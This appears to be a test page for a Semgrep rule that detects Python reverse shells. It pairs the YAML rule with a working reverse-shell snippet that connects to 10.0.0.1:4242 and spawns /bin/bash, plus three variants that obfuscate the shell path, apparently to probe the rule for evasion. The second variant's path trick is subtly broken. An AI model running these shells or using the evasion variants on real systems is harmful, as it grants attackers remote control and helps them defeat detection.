### Rule
``` yaml
rules:
  - id: python-reverse-shell
    patterns:
      - pattern-either:
          - pattern: pty.spawn("$BINPATH",...)
          - pattern: subprocess.call(["$BINPATH",...],...)
      - metavariable-regex:
          metavariable: $BINPATH
          regex: /bin/.*?sh\b
      - pattern-inside: |
          import socket
          ...
          $S = socket.socket(...)
          ...
          $S.connect(($IP,$PORT),...)
          ...
    message: Semgrep found a Python reverse shell using $BINPATH to $IP at $PORT
    metadata:
      cwe:
        - "CWE-553: Command Shell in Externally Accessible Directory"
      category: security
      technology:
        - python
      references:
        - https://cwe.mitre.org/data/definitions/553.html
      subcategory:
        - audit
      likelihood: LOW
      impact: MEDIUM
      confidence: LOW
      license: Commons Clause License Condition v1.0[LGPL-2.1-only]
      vulnerability_class:
        - Command Injection
    languages:
      - python
    severity: WARNING
````
### Code Snippet
```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4242))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

import pty
pty.spawn("/bin/bash")
```
### Transformation 1*
```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4242))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

import pty
pty.spawn("/bin/bash"[:])
```
### Transformation 2
```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4242))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

import pty
pty.spawn(list("/bin/bash")[0])
```
### Transformation 3
```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4242))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

import pty
shell = "hsab/nib/"
shell = shell[::-1]
pty.spawn(shell)
```
